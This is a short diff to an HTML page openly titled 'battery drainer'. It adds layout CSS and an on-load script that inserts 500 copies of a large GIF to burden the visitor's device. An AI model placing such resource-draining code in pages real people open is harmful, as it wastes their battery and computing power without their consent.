@@ -2,8 +2,31 @@
 <html>
 <head>
 <title>battery drainer</title>
+<style>
+.img {
+    display: flex;
+    flex-direction: row;
+    max-width: 100%;  
+    height: auto;  
+}
+body {
+    display: flex;
+    flex-direction: row;
+    flex-wrap: wrap;
+}
+</style>
 </head>
 <body>
-<img src="big files.gif">
+<img src="big files.gif" class="img" width=100 height=100>
+    
+<script>
+
+for (let i = 0; i < 500; i++) {
+    var e = document.createElement("p");
+    e.innerHTML = '<img src="big files.gif" width=25 height=25>'
+    document.body.appendChild(e)
+}
+
+</script>
 </body>
 </html>
